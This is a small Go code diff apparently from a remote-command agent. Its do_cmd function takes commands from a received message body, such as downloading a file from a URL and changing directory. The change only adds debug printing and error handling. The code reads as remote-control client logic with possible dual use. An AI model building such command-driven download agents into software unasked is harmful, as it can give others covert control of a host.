@@ -98,6 +98,7 @@ func postFile(filename string, targetUrl string) error {
 }
 
 func downloadFile(filepath string, url string) (err error) {
+  fmt.Printf("Filepath:%s\n", filepath)
 
   // Create the file
   out, err := os.Create(filepath)
@@ -233,10 +234,13 @@ func do_cmd(body []byte) bool {
             filename := path.Base(u.Path)
             wd, _ := os.Getwd()
             filename = filepath.Join(wd, filename)
-
+            
             //rec := get_args(record.([]interface{}))
             fmt.Printf("Rec: %s\n", record)
-            downloadFile(filename, file_url)
+            err := downloadFile(filename, file_url)
+            if err != nil{
+                fmt.Println(err)
+            }
         } else if cmd == "cd" {
             dir := record.([]interface{})[0].(string)
             fmt.Printf("Changing Dir: %s \n", fmt.Sprint(dir) )
